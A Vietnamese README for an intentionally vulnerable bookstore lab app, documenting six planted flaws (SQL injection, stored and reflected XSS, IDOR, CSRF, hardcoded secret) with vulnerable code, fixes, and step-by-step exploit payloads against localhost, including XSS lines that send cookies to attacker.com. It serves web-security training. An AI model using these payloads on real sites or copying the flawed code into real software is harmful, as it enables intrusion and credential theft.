# 🔓 Danh sách lỗ hổng bảo mật - JVA Bookstore

> **⚠️ CẢNH BÁO:** Các lỗ hổng này được tạo **CỐ Ý** cho mục đích thực hành Lab An toàn Web.
> Tuyệt đối **KHÔNG** triển khai lên môi trường production.

---

## Tổng quan

| # | Loại lỗ hổng | Mức độ | File bị ảnh hưởng | CWE |
|---|---|---|---|---|
| 1 | SQL Injection | 🔴 Nghiêm trọng | `BookDAO.java`, `BooksApiServlet.java` | CWE-89 |
| 2 | Stored XSS | 🔴 Nghiêm trọng | `ReviewDAO.java`, `book-detail.jsp` | CWE-79 |
| 3 | Reflected XSS | 🟠 Cao | `BooksApiServlet.java` | CWE-79 |
| 4 | IDOR | 🟠 Cao | `ProfileServlet.java` | CWE-639 |
| 5 | CSRF | 🟡 Trung bình | Toàn bộ API (không kiểm tra CSRF token) | CWE-352 |
| 6 | Hardcoded Secret | 🟡 Trung bình | `JwtFilter.java` | CWE-798 |

---

## 1. 🔴 SQL Injection

### Mô tả
Endpoint tìm kiếm sách `/api/books/search` sử dụng `Statement.executeQuery()` với chuỗi SQL được nối trực tiếp từ input người dùng, **không dùng `PreparedStatement`**.

### File bị ảnh hưởng
- `src/main/java/dao/BookDAO.java` — method `searchBooksUnsafe()`
- `src/main/java/web/BooksApiServlet.java` — method `handleSearch()`

### Endpoint (KHÔNG cần đăng nhập - public API)
```
GET /api/books/search?q=<PAYLOAD>
```

### Khai thác

**Bước 1 - Xác nhận lỗi (dấu nháy đơn):**
```
http://localhost:8081/api/books/search?q=test'
```
→ Nếu lỗi SQL hiện ra → confirm SQL Injection

**Bước 2 - Trả về tất cả sách:**
```
http://localhost:8081/api/books/search?q=test' OR '1'='1
```

**Bước 3 - UNION-based (lấy thông tin users):**
> Lưu ý: Cần đúng số cột. Câu truy vấn gốc SELECT 18 cột.
```
http://localhost:8081/api/books/search?q=test' UNION SELECT 1,username,email,password_hash,'cat',null,null,0,null,null,null,'active',0,null,0,0,0,0 FROM users--
```

**Bước 4 - Time-based blind:**
```
http://localhost:8081/api/books/search?q=test'; SELECT pg_sleep(5)--
```

### Code lỗi
```java
// BookDAO.java - searchBooksUnsafe()
String sql = BASE_SELECT +
    " WHERE b.status = 'active' AND (b.title ILIKE '%" + keyword + "%' ...)" +
    " ORDER BY b.created_at DESC LIMIT " + limit;
Statement statement = connection.createStatement();
ResultSet rs = statement.executeQuery(sql); // ← SQL Injection!
```

### Cách khắc phục
Sử dụng `PreparedStatement` với tham số `?` thay vì nối chuỗi.

---

## 2. 🔴 Stored XSS (Cross-Site Scripting lưu trữ)

### Mô tả
Hệ thống review sách cho phép **bất kỳ user đã đăng nhập** gửi đánh giá (không cần mua hàng). Nội dung review được lưu vào DB **không sanitize** và khi hiển thị trên trang chi tiết sách, sử dụng `${r.comment}` (EL expression thô) thay vì `<c:out>` (có escape HTML).

### File bị ảnh hưởng
- `src/main/java/dao/ReviewDAO.java` — method `upsertReview()` (bỏ validation)
- `src/main/webapp/book-detail.jsp` — dòng 265 (render `${r.comment}` không escape)

### Endpoint (CẦN đăng nhập)
```
POST /api/reviews
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "bookId": 1,
  "rating": 5,
  "content": "<script>alert('XSS')</script>"
}
```

### Khai thác

**Bước 1 - Đăng nhập lấy token:**
```
POST /api/login
{"username": "user@example.com", "password": "password"}
```
→ Lấy token từ response

**Bước 2 - Gửi review chứa XSS payload:**
```bash
curl -X POST http://localhost:8081/api/reviews \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"bookId":1,"rating":5,"content":"<script>alert(document.cookie)</script>"}'
```

**Bước 3 - Trigger XSS:**
Truy cập trang chi tiết sách: `http://localhost:8081/books/detail?id=1`
→ Script trong review sẽ thực thi trên trình duyệt!

**Payload nâng cao:**
```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<svg onload="alert(localStorage.getItem('auth_token'))">
```

### Code lỗi
```java
// ReviewDAO.java - Không kiểm tra canReview và tối thiểu 50 ký tự
public static ReviewRecord upsertReview(...) {
    // Bỏ: if (!canReview(userId, bookId)) throw ...
    // Bỏ: if (content.length() < 50) throw ...
}
```
```jsp
<%-- book-detail.jsp - Render trực tiếp không escape --%>
${r.comment}  <%-- Đáng lẽ: <c:out value="${r.comment}" /> --%>
```

### Cách khắc phục
1. Sử dụng `<c:out>` hoặc `fn:escapeXml()` trong JSP
2. Validate input trên server
3. Thêm Content-Security-Policy header

---

## 3. 🟠 Reflected XSS

### Mô tả
Endpoint tìm kiếm trả về **HTML response** chứa keyword trực tiếp từ URL **không được escape**. Kẻ tấn công gửi URL chứa script cho nạn nhân.

### File bị ảnh hưởng
- `src/main/java/web/BooksApiServlet.java` — method `handleSearch()`

### Endpoint (KHÔNG cần đăng nhập)
```
GET /api/books/search?q=<PAYLOAD>
```

### Khai thác

**Khai thác đơn giản:**
```
http://localhost:8081/api/books/search?q=<script>alert('XSS')</script>
```

**Đánh cắp cookie:**
```
http://localhost:8081/api/books/search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**Đánh cắp JWT token:**
```
http://localhost:8081/api/books/search?q=<img src=x onerror="alert(localStorage.getItem('auth_token'))">
```

### Code lỗi
```java
// BooksApiServlet.java - Phản hồi HTML chứa input chưa escape
html.append("<h3>Kết quả tìm kiếm cho: ").append(keyword).append("</h3>");
// keyword không được encode → HTML/JS thực thi!
```

### Cách khắc phục
Escape HTML entities trước khi render: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`

---

## 4. 🟠 IDOR (Insecure Direct Object Reference)

### Mô tả
Endpoint `/api/profile/user-info` cho phép xem thông tin (bao gồm **email, password hash, role**) của **bất kỳ user nào** chỉ bằng cách thay đổi `userId` parameter.

### File bị ảnh hưởng
- `src/main/java/web/ProfileServlet.java` — method `getAnyUserProfile()`

### Endpoint (CẦN đăng nhập với bất kỳ tài khoản nào)
```
GET /api/profile/user-info?userId=<ID>
Authorization: Bearer <JWT_TOKEN>
```

### Khai thác

**Xem thông tin user id=1 (có thể là admin):**
```bash
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://localhost:8081/api/profile/user-info?userId=1"
```

**Duyệt tuần tự tất cả users (enumeration):**
```bash
for i in $(seq 1 100); do
  echo "=== User $i ==="
  curl -s -H "Authorization: Bearer <TOKEN>" \
    "http://localhost:8081/api/profile/user-info?userId=$i"
  echo
done
```

### Dữ liệu bị lộ
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@bookstore.vn",
    "passwordHash": "$2a$10$...",
    "role": "admin",
    "status": "active",
    "createdAt": "2024-01-01T00:00:00"
  }
}
```
> ⚠️ Đặc biệt nguy hiểm: lộ **password hash** giúp offline brute-force.

### Cách khắc phục
Kiểm tra quyền sở hữu: `userId` từ token phải khớp với `userId` được yêu cầu.

---

## 5. 🟡 CSRF (Cross-Site Request Forgery)

### Mô tả
Toàn bộ API **không kiểm tra CSRF token**. Kẻ tấn công tạo trang web chứa form tự động POST đến ứng dụng.

### Khai thác
Tạo trang HTML và dụ nạn nhân truy cập:
```html
<html>
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://localhost:8081/api/profile/addresses" method="POST">
    <input type="hidden" name="recipientName" value="HACKER">
    <input type="hidden" name="phone" value="0000000000">
    <input type="hidden" name="line1" value="Hacked Address">
  </form>
</body>
</html>
```

### Cách khắc phục
Thêm CSRF token vào form và kiểm tra ở server.

---

## 6. 🟡 Hardcoded Secret

### Mô tả
Admin secret key hardcode `"dev-secret-key-change-me"` trong `JwtFilter.java`.

### File bị ảnh hưởng
- `src/main/java/filters/JwtFilter.java` — dòng 148

### Khai thác (KHÔNG cần đăng nhập)
```bash
# Truy cập admin orders API
curl "http://localhost:8081/api/admin/orders?secret=dev-secret-key-change-me"

# Hoặc qua header
curl -H "X-Admin-Secret: dev-secret-key-change-me" \
     "http://localhost:8081/api/admin/orders"
```

### Code lỗi
```java
private String getAdminSecret() {
    String env = System.getenv("ADMIN_PANEL_SECRET");
    if (env != null) { return env; }
    return "dev-secret-key-change-me";  // ← HARDCODED!
}
```

### Cách khắc phục
Không có giá trị fallback mặc định. Bắt buộc cấu hình qua environment variable.

---

## Tổng kết thứ tự khai thác đề xuất

| Bước | Lỗ hổng | Độ khó | Ghi chú |
|---|---|---|---|
| 1 | Reflected XSS | ⭐ Dễ | Chỉ cần mở URL trên trình duyệt |
| 2 | Hardcoded Secret | ⭐ Dễ | Copy-paste URL |
| 3 | SQL Injection | ⭐⭐ Trung bình | Cần hiểu cấu trúc SQL |
| 4 | Stored XSS | ⭐⭐ Trung bình | Cần đăng nhập + gửi POST |
| 5 | IDOR | ⭐⭐ Trung bình | Cần đăng nhập + thay đổi userId |
| 6 | CSRF | ⭐⭐⭐ Khó | Cần dụ nạn nhân truy cập trang độc |
